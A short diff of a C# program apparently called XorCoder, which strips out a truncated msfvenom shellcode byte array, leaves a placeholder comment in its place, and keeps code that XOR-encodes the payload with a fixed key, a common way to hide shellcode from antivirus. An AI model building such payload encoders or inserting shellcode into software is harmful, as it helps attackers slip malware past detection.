@@ -13,9 +13,7 @@ namespace XorCoder
     {
         public static void Main(string[] args)
         {
-            // msfvenom payload shellcode -f csharp
-            byte[] buf = new byte[735] { 0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,
-            ... 0xd5 };
+            byte[] buf = // msfvenom payload shellcode -f csharp
 
             // Encode the payload with XOR (fixed key)
             byte[] encoded = new byte[buf.Length];
